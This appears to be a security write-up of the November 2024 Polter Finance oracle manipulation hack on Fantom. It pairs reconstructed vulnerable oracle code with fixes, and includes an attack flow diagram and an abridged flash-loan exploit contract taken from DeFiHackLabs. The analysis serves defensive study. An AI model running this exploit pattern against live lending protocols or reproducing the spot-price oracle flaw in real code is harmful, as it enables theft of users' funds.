# Polter Finance — Empty Market Oracle Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-16 |
| **Protocol** | Polter Finance (Aave v2 fork, Fantom) |
| **Chain** | Fantom |
| **Loss** | $8,700,000 (wFTM, MIM, sFTMX, axlUSDC, wBTC, wETH, USDCe, wSOL) |
| **Attacker** | [0x511f...44a6](https://ftmscan.com/address/0x511f427Cdf0c4e463655856db382E05D79Ac44a6) |
| **Attack Contract** | [0xA214...33a](https://ftmscan.com/address/0xA21451aC32372C123191B3a4FC01deB69F91533a) |
| **Attack Tx** | [0x5118...eac](https://ftmscan.com/tx/0x5118df23e81603a64c7676dd6b6e4f76a57e4267e67507d34b0b26dd9ee10eac) |
| **Vulnerable Contract** | [0x867f...6d5](https://ftmscan.com/address/0x867fAa51b3A437B4E2e699945590Ef4f2be2a6d5) (LendingPool) |
| **Oracle Contract** | [ChainlinkUniV2Adapter](https://ftmscan.com/address/0x875d564a6a86f6154592b88f7a107a517f00cc17) / [PriceFeedV2](https://ftmscan.com/address/0x80663EDff11e99e8E0B34cb9C3E1fF32E82A80Fe) |
| **Root Cause** | The oracle for the newly listed BOO lending market relied directly on SpookySwap liquidity pool spot prices — the attacker drained the pool via flash loan to inflate the BOO price to ~$1.37 trillion, then borrowed all pool assets |
| **Attack Fork Block** | 97,508,838 (Fantom) |
| **PoC Source** | [DeFiHackLabs — PolterFinance_exploit.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/PolterFinance_exploit.sol) |

---

## 1. Vulnerability Overview

Polter Finance was a decentralized lending protocol on the Fantom chain based on Aave v2, with a total value locked (TVL) of approximately $9.7 million. On November 16, 2024, an attacker exploited a flaw in the price oracle logic of the newly listed **BOO (SpookySwap governance token) lending market** to drain assets approaching the entire TVL.

### Core Issue: Empty Market + Spot Price Dependency

The BOO market was in its early operational phase with very limited liquidity. Polter Finance used the `ChainlinkUniV2Adapter` contract to directly use the **current spot price** from SpookySwap V2/V3 pools for BOO collateral valuation. This design contained two simultaneous flaws:

1. **No TWAP (Time-Weighted Average Price)**: Completely defenseless against instantaneous price manipulation
2. **No price spike validation**: The `answeredInRound` value in the `getRoundData()` function was hardcoded, bypassing the price validity check logic in AaveOracle

The attacker used a flash loan to remove most BOO tokens from the liquidity pool, inflating the spot price to **hundreds of trillions times its actual value**, then used just 1 BOO as collateral to withdraw all assets from every lending pool in the protocol.

This attack pattern mirrors the May 2024 Sonne Finance hack (Optimism, empty market donation attack), once again demonstrating that **newly listed or low-liquidity markets** are particularly vulnerable.

---

## 2. Vulnerable Code Analysis

### 2.1 ChainlinkUniV2Adapter — Direct Spot Price Usage (Core Vulnerability)

**Vulnerable Code (reconstructed):**
```solidity
// ChainlinkUniV2Adapter.sol
// ❌ VULNERABILITY: Calculates price directly from current SpookySwap pool reserve ratio
//                  Completely unable to detect reserve manipulation via flash loan

function _fetchPrice() internal view returns (uint256) {
    // Calculate spot price directly from SpookySwap V2 pair reserves
    (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(spookyPair).getReserves();

    // ❌ Only uses current block's reserve ratio — no TWAP
    uint256 price = (uint256(reserve1) * 1e18) / uint256(reserve0);
    return price;
}

function getRoundData(uint80 _roundId)
    external
    view
    returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    )
{
    int256 price = int256(_fetchPrice());
    // ❌ Hardcoded answeredInRound: always returns roundId = 2
    //    This causes AaveOracle's price validity check logic to be bypassed
    return (2, price, block.timestamp, block.timestamp, 2);
}

function latestRoundData()
    external
    view
    returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    )
{
    // ❌ Latest price also returns spot price — no spike detection
    int256 price = int256(_fetchPrice());
    return (2, price, block.timestamp, block.timestamp, 2);
}
```

**Fixed Code:**
```solidity
// ✅ Fix: Use Uniswap V3 TWAP + price spike detection

uint32 constant TWAP_PERIOD = 1800; // 30-minute TWAP
uint256 constant MAX_PRICE_DEVIATION = 150; // Allow max 150% price deviation

function _fetchPriceTWAP() internal view returns (uint256) {
    // ✅ Query Uniswap V3 TWAP — 30-minute historical average price
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = TWAP_PERIOD;
    secondsAgos[1] = 0;
    (int56[] memory tickCumulatives,) = IUniswapV3Pool(v3Pool).observe(secondsAgos);
    int56 tickDelta = tickCumulatives[1] - tickCumulatives[0];
    int24 timeWeightedTick = int24(tickDelta / int56(uint56(TWAP_PERIOD)));
    return TickMath.getSqrtRatioAtTick(timeWeightedTick);
}

function latestRoundData()
    external
    view
    returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    )
{
    int256 twapPrice = int256(_fetchPriceTWAP());
    int256 spotPrice = int256(_fetchSpotPrice());

    // ✅ Revert if spot price exceeds threshold deviation from TWAP
    uint256 deviation = spotPrice > twapPrice
        ? (uint256(spotPrice - twapPrice) * 100) / uint256(twapPrice)
        : (uint256(twapPrice - spotPrice) * 100) / uint256(twapPrice);
    require(deviation <= MAX_PRICE_DEVIATION, "Price deviation too high");

    // ✅ Return dynamic roundId
    uint80 currentRound = ++roundId;
    return (currentRound, twapPrice, block.timestamp, block.timestamp, currentRound);
}
```

**Issue**: Because only the spot price of the current block was used via `getReserves()`, manipulating pool reserves within the same block via flash loan causes the distorted price to be directly reflected in collateral valuation. Additionally, hardcoding `answeredInRound` to always `2` neutralizes AaveOracle's stale price defense logic that checks whether "the last answered round is the current round."

### 2.2 AaveOracle — No Validation When Registering New Markets

**Vulnerable Code (reconstructed):**
```solidity
// AaveOracle.sol (Aave v2 fork)
// ❌ VULNERABILITY: Does not validate oracle implementation safety when adding new asset markets
//                  An oracle address, once registered, is immediately used in production

function setAssetSources(
    address[] calldata assets,
    address[] calldata sources
) external onlyOwner {
    for (uint256 i = 0; i < assets.length; i++) {
        assetsSources[assets[i]] = IChainlinkAggregator(sources[i]);
        // ❌ No validation of oracle implementation method, TWAP usage, price range limits, etc.
        emit AssetSourceUpdated(assets[i], sources[i]);
    }
}

function getAssetPrice(address asset) public view returns (uint256) {
    IChainlinkAggregator source = assetsSources[asset];
    // ❌ Trusts the oracle even if a spot price oracle is registered
    (, int256 price,,,) = source.latestRoundData();
    require(price > 0, "Invalid price");
    return uint256(price);
}
```

**Fixed Code:**
```solidity
// ✅ Fix: Validate minimum TWAP period and deviation limits when registering oracle

struct OracleConfig {
    address source;
    uint256 maxPriceDeviation; // Maximum allowed deviation (basis points)
    uint32 heartbeatInterval;  // Maximum price update interval
}

mapping(address => OracleConfig) public assetOracleConfigs;

function setAssetSources(
    address[] calldata assets,
    address[] calldata sources,
    uint256[] calldata maxDeviations
) external onlyOwner {
    for (uint256 i = 0; i < assets.length; i++) {
        // ✅ Validate basic behavior of oracle address
        (, int256 price,, uint256 updatedAt,) =
            IChainlinkAggregator(sources[i]).latestRoundData();
        require(price > 0, "Oracle: invalid initial price");
        require(updatedAt > block.timestamp - 3600, "Oracle: stale data");

        assetOracleConfigs[assets[i]] = OracleConfig({
            source: sources[i],
            maxPriceDeviation: maxDeviations[i],
            heartbeatInterval: 3600
        });
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker sourced funds via Tornado Cash on the Ethereum network and bridged them to Fantom. Without any prior approvals or token accumulation, the attacker deployed the attack contract (`EXPLOIT_DO3`) and completed the entire attack in a single transaction.

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────┐
│  Attacker EOA (0x511f...44a6)                                    │
│  Funded via Tornado Cash → Fantom bridge                        │
└────────────────────────┬────────────────────────────────────────┘
                         │ Deploy attack contract and call doTask()
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  EXPLOIT_DO3 Contract (0xA214...33a)                            │
│  Step 1: WFTM_SpookyToken_V3Pool.flash(...)                     │
│          → Flash loan entire BOO balance from SpookySwap V3     │
│          → Borrow ~1,154,788 BOO                                │
└────────────────────────┬────────────────────────────────────────┘
                         │ Enter uniswapV3FlashCallback()
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 2: JFTM_SpookyToken_V2Pool.swap(...)                      │
│          → Drain nearly all BOO from SpookySwap V2 pool         │
│          → V2 pool: 269,042 BOO removed, balance ≈ minimum      │
│                                                                 │
│  Step 3: router.swapExactTokensForTokensSupportingFee...        │
│          → Buy small amount of BOO with 5,000 WFTM (gas adjust) │
└────────────────────────┬────────────────────────────────────────┘
                         │ Enter uniswapV2Call() callback
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 4: Oracle price manipulation result                        │
│          SpookySwap V2/V3 pool BOO balance ≈ 0                  │
│          ChainlinkUniV2Adapter._fetchPrice()                    │
│          → reserve0 ≈ dust → price inflated by hundreds of      │
│            trillions of times                                   │
│          → 1 BOO value ≈ $1,370,000,000,000 ($1.37 trillion)    │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 5: pitfall.deposit(BOO, 1e18, ...)                        │
│          → Deposit only 1 BOO (~$0.33 real value) as collateral │
│          → AaveOracle: collateral value evaluated at $1.37T     │
└────────────────────────┬────────────────────────────────────────┘
                         │ Borrow maximum amount from all asset pools
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 6: Drain entire lending pool (8 assets)                   │
│  ├── pitfall.borrow(WFTM,  9,134,844 wFTM,  ...)               │
│  ├── pitfall.borrow(MIM,   entire MIM,       ...)               │
│  ├── pitfall.borrow(sFTMX, entire sFTMX,    ...)               │
│  ├── pitfall.borrow(axlUSDC, entire axlUSDC,...)               │
│  ├── pitfall.borrow(wBTC,  entire wBTC,      ...)               │
│  ├── pitfall.borrow(wETH,  entire wETH,      ...)               │
│  ├── pitfall.borrow(USDCe, entire USDCe,     ...)               │
│  └── pitfall.borrow(wSOL,  entire wSOL,      ...)               │
│  Total stolen: ~$8,700,000                                      │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 7: Repay V2 flash loan                                     │
│          spookyToken.transfer(V2Pool, (a1 * 1000)/998 + 1)      │
│          → Repayment complete including fee                      │
│                                                                 │
│  Step 8: Transfer remaining assets to attacker EOA              │
│          All stolen tokens → owner (attacker EOA)               │
└─────────────────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 9: Repay V3 flash loan and complete                        │
│          spookyToken.transfer(V3Pool, needToRepay)              │
│  Attacker net profit: ~$8,700,000 worth of multiple tokens      │
│  Subsequently transferred to Binance wallet, some via Tornado Cash│
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Field | Details |
|------|------|
| Attacker Net Profit | ~$8,700,000 worth of wFTM, MIM, sFTMX, axlUSDC, wBTC, wETH, USDCe, wSOL |
| Protocol TVL Change | $9,700,000 → ~$60,000 |
| Capital Used | Flash loan (zero net cost excluding fees) |
| Fund Movement Path | Fantom → bridge → Binance wallet |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/PolterFinance_exploit.sol

contract EXPLOIT_DO3 {
    function doTask() public payable {
        // [Step 1] Request flash loan of entire BOO token balance from SpookySwap V3
        // Borrow all BOO from V3 pool to begin removing liquidity
        WFTM_SpookyToken_V3Pool.flash(
            address(this),
            0,
            spookyToken.balanceOf(address(WFTM_SpookyToken_V3Pool)),
            ""
        );
    }

    function uniswapV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        uint256 needToRepay = spookyToken.balanceOf(address(this)) + fee1;

        // [Step 2] Drain nearly all BOO tokens from SpookySwap V2 pool as well
        // → Remove BOO from both pools to extreme distort the spot price
        JFTM_SpookyToken_V2Pool.swap(
            0,
            spookyToken.balanceOf(address(JFTM_SpookyToken_V2Pool)) - 1e6,
            address(this),
            "0"  // Trigger callback with "0" (enter uniswapV2Call)
        );

        // [Step 7] Repay V3 flash loan — processed after callback completes
        spookyToken.transfer(address(WFTM_SpookyToken_V3Pool), needToRepay);
        spookyToken.transfer(address(owner), spookyToken.balanceOf(address(this)));
        WFTM.transfer(address(owner), WFTM.balanceOf(address(this)));
    }

    function uniswapV2Call(address s, uint256 a0, uint256 a1, bytes calldata data) external {
        // [Step 5] Deposit collateral: only 1 BOO token (real value ~$0.33)
        // Oracle evaluates this 1 BOO at $1.37 trillion
        spookyToken.approve(address(pitfall), 1e18);
        pitfall.deposit(address(spookyToken), 1e18, address(this), 0);

        // [Step 6] Borrow entire balance from all lending pools
        // Drain wFTM pool
        {
            PitfallInterface.ReserveData memory reserveData = pitfall.getReserveData(address(WFTM));
            pitfall.borrow(address(WFTM), WFTM.balanceOf(reserveData.aTokenAddress), 2, 0, address(this));
        }
        // Drain MIM pool
        {
            PitfallInterface.ReserveData memory reserveData = pitfall.getReserveData(address(MIM));
            pitfall.borrow(address(MIM), MIM.balanceOf(reserveData.aTokenAddress), 2, 0, address(this));
            MIM.transfer(address(owner), MIM.balanceOf(address(this)));
        }
        // ... (sFTMX, axlUSDC, wBTC, wETH, USDCe, wSOL follow the same pattern)

        // [Step 7] Repay V2 flash loan (including 0.2% fee)
        spookyToken.transfer(address(JFTM_SpookyToken_V2Pool), (a1 * 1000) / 998 + 1);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Oracle using AMM spot price directly | CRITICAL | CWE-682 | `04_oracle_manipulation.md` — Pattern 1 |
| V-02 | Hardcoded `answeredInRound` bypasses stale price defense | HIGH | CWE-693 | `11_logic_error.md` — Pattern 2 |
| V-03 | No oracle safety validation when registering new markets | HIGH | CWE-345 | `04_oracle_manipulation.md` — Pattern 2 |
| V-04 | Operating unaudited protocol fork | MEDIUM | CWE-1076 | `11_logic_error.md` |

### V-01: Oracle Using AMM Spot Price Directly

- **Description**: `ChainlinkUniV2Adapter` calculates the BOO token price using `getReserves()` or the current reserve ratio of SpookySwap V2/V3 pools. This spot price can be distorted by trillions of times via flash loan liquidity removal within the same block.
- **Impact**: If an attacker drains the pool via flash loan, a single BOO token gets evaluated as collateral exceeding the entire protocol TVL, allowing all assets to be borrowed without real collateral.
- **Attack Condition**: The BOO market is active, and BOO can be simultaneously removed from both V2 and V3 pools via flash loan.

### V-02: Hardcoded `answeredInRound` Bypasses Stale Price Defense

- **Description**: The `getRoundData()` and `latestRoundData()` functions always return `2` for `answeredInRound`. In Chainlink-compatible oracles, if `roundId > answeredInRound` the price should be treated as stale, but the hardcoded value causes this check to always pass.
- **Impact**: No matter how drastically the price changes, the oracle returns it as a valid, current price, and the stale price detection logic in the consumer contract (AaveOracle) is completely neutralized.
- **Attack Condition**: Any asset for which `ChainlinkUniV2Adapter` is registered as the oracle source.

### V-03: No Oracle Safety Validation When Registering New Markets

- **Description**: The `setAssetSources()` function in the Aave v2 fork only accepts and registers oracle addresses, with zero validation of whether the oracle uses TWAP, has price deviation limits, or has stale price protection. The BOO market was registered without an audit.
- **Impact**: An unsafe spot price oracle is used for collateral valuation, making the entire protocol vulnerable.
- **Attack Condition**: Admin registers an unvalidated oracle.

### V-04: Operating Unaudited Protocol Fork

- **Description**: Polter Finance copied Geist Finance (an Aave v2 fork) and did not perform a separate security audit when adding the new BOO market.
- **Impact**: The security assumptions of the existing code were incorrectly assumed to apply to new assets as well, leaving the team unaware of risks arising from per-asset oracle design differences.
- **Attack Condition**: Deployment of new market additions without an audit.

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Immediately Replace Spot Price Oracle — Migrate to TWAP-Based**

```solidity
// ✅ Uniswap V3 TWAP-based oracle implementation
// Use time-weighted average price of at least 30 minutes

uint32 constant MIN_TWAP_PERIOD = 1800; // 30 minutes

function _getV3TWAP(address pool) internal view returns (uint256) {
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = MIN_TWAP_PERIOD;
    secondsAgos[1] = 0;

    (int56[] memory tickCumulatives,) = IUniswapV3Pool(pool).observe(secondsAgos);
    int56 delta = tickCumulatives[1] - tickCumulatives[0];
    int24 avgTick = int24(delta / int56(uint56(MIN_TWAP_PERIOD)));
    uint160 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(avgTick);
    return _sqrtPriceX96ToPrice(sqrtPriceX96);
}
```

**2) Add Price Deviation Validation**

```solidity
// ✅ Revert transaction if spot price deviation from TWAP exceeds threshold
uint256 constant MAX_DEVIATION_BPS = 1000; // 10%

function getAssetPrice(address asset) public view returns (uint256) {
    uint256 twapPrice = _getV3TWAP(assetPools[asset]);
    uint256 spotPrice = _getSpotPrice(assetPools[asset]);

    uint256 deviation = twapPrice > spotPrice
        ? ((twapPrice - spotPrice) * 10000) / twapPrice
        : ((spotPrice - twapPrice) * 10000) / twapPrice;

    require(deviation <= MAX_DEVIATION_BPS, "Oracle: price deviation exceeded");
    return twapPrice;
}
```

**3) Dynamic `answeredInRound` Handling**

```solidity
// ✅ Dynamic roundId management — enable stale price defense
uint80 private _currentRound;

function latestRoundData() external view returns (
    uint80 roundId, int256 answer,
    uint256 startedAt, uint256 updatedAt, uint80 answeredInRound
) {
    // ✅ Dynamically increment current round ID to distinguish from previous rounds
    uint80 round = _currentRound;
    int256 price = int256(_fetchPriceTWAP());
    return (round, price, block.timestamp, block.timestamp, round);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Spot price oracle | Mandate minimum 30-minute TWAP for all assets; use official Chainlink price feeds in parallel |
| New market registration | Introduce oracle safety validation checklist (TWAP usage, deviation limits, heartbeat interval) |
| Empty market risk | Set minimum liquidity thresholds before activating new markets; apply graduated borrow caps |
| Hardcoded values | Manage Chainlink-compatible fields such as `answeredInRound` dynamically |
| Audit process | Always conduct independent security audits for new market additions, even on forked protocols |
| Circuit breaker | Introduce automatic circuit-breaking logic that triggers on abnormal price spikes within a single block |

---

## 7. Lessons Learned

1. **Spot prices cannot be used as oracles**: Prices calculated from current AMM pool reserve ratios can be arbitrarily manipulated within the same block via flash loans. TWAP or official Chainlink feeds must be used for lending and liquidation decisions.

2. **Empty markets are a separate risk category**: The lower the liquidity in a newly listed market, the more extreme the price distortion achievable with a small flash loan. Similar patterns have repeated in Sonne Finance (2024-05) and Radiant Capital (2024-01), yet the same mistake continues to recur.

3. **A fork does not replace an audit**: Even forks of battle-tested protocols like Aave v2 and Compound require independent security review when adding new assets or markets. The security assumptions of forked code are only valid in the context of the original asset environment.

4. **Chainlink-compatible interface fields must not be implemented superficially**: Fields like `answeredInRound` are coupled to the stale price defense logic of consumer contracts. Hardcoding them or returning arbitrary values neutralizes the security layer of oracle consumers.

5. **Multi-oracle validation is necessary**: Instead of relying solely on a single DEX pool, using a dual-oracle pattern that cross-validates the deviation between official Chainlink feeds and TWAP significantly increases manipulation resistance.

6. **New market activation should be gradual**: New asset markets should start with low borrow caps and expand incrementally once sufficient liquidity has accumulated. Allowing the full TVL to be borrowed immediately at launch is dangerous.

---

## 8. On-Chain Verification

> On-chain verification requires access to a Fantom RPC endpoint. The following is a verification summary based on collected on-chain data.

### 8.1 Attack Transaction Basic Information

| Field | Value |
|------|-----|
| Attack Tx | [0x5118...eac](https://ftmscan.com/tx/0x5118df23e81603a64c7676dd6b6e4f76a57e4267e67507d34b0b26dd9ee10eac) |
| Attacker EOA | [0x511f...44a6](https://ftmscan.com/address/0x511f427Cdf0c4e463655856db382E05D79Ac44a6) |
| Attack Contract | [0xA214...33a](https://ftmscan.com/address/0xA21451aC32372C123191B3a4FC01deB69F91533a) |
| Fork Block | 97,508,838 |
| Chain | Fantom (Chain ID: 250) |

### 8.2 PoC vs. On-Chain Amount Comparison

| Field | PoC Value | On-Chain Reference | Notes |
|------|--------|-------------|------|
| V3 Flash Loan BOO | Entire V3 pool balance | ~1,154,788 BOO | Consistent across multiple analysis reports |
| V2 Drained BOO | V2 pool balance - 1e6 | ~269,042 BOO | Consistent across multiple analysis reports |
| 1 BOO Collateral Valuation | — | ~$1,370,000,000,000 | Oracle-distorted value |
| wFTM Borrowed | Entire aToken balance | 9,134,844 wFTM | Consistent across multiple reports |
| Total Stolen | — | ~$8,700,000 | Varies $7M–$12M across reports (market price differences) |

> **Note**: Some reports record the loss as $12M (including the protocol founder's statement of SGD 16M). $8.7M is an estimate based on token prices at the time of the attack; total loss estimates may vary with subsequent price movements.

### 8.3 On-Chain Event Log Sequence (Reconstructed)

```
1. Flash (V3 Pool)           → Withdraw entire BOO balance
2. Swap (V2 Pool)            → Drain BOO from V2
3. Swap (Router)             → Small WFTM → BOO
4. Approval (BOO → pitfall)  → Approve 1 BOO
5. Deposit (pitfall)         → Deposit 1 BOO as collateral
6. Borrow × 8               → wFTM, MIM, sFTMX, axlUSDC, wBTC, wETH, USDCe, wSOL
7. Transfer × 8             → Stolen tokens → owner
8. Transfer (V2 repay)       → BOO → V2 Pool
9. Transfer (V3 repay)       → BOO → V3 Pool
```

### 8.4 Precondition Verification

| Field | Status |
|------|------|
| Attacker pre-funding | Via Tornado Cash, moved via Fantom bridge |
| BOO market activation | Already active before the attack |
| Protocol audit | Not conducted (officially acknowledged by the team) |
| V2/V3 pool liquidity | Sufficient BOO balance for the attack to be feasible |

---

## References

- [Halborn — Polter Finance Hack Explained](https://www.halborn.com/blog/post/explained-the-polter-finance-hack-november-2024)
- [SolidityScan — Polter Finance Hack Analysis](https://blog.solidityscan.com/polter-finance-hack-analysis-c5eaa6dcfd40)
- [Three Sigma — Polter Finance Exploit: Fork-and-Pray Failure](https://threesigma.xyz/blog/exploit/polter-finance-exploit-explained-usd12m-loss)
- [QuillAudits — Polter Finance $12M Hack Analysis](https://www.quillaudits.com/blog/hack-analysis/polter-finance-12m-hack-analysis)
- [Olympix — Polter's $12M Oracle Exploit](https://olympixai.medium.com/polters-12m-oracle-exploit-cloberdex-s-reentrancy-and-coin31-s-access-control-failure-a16f0005f729)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/PolterFinance_exploit.sol)
- [FTMScan — Attack Tx](https://ftmscan.com/tx/0x5118df23e81603a64c7676dd6b6e4f76a57e4267e67507d34b0b26dd9ee10eac)
- [FTMScan — Vulnerable Contract](https://ftmscan.com/address/0x867fAa51b3A437B4E2e699945590Ef4f2be2a6d5#code)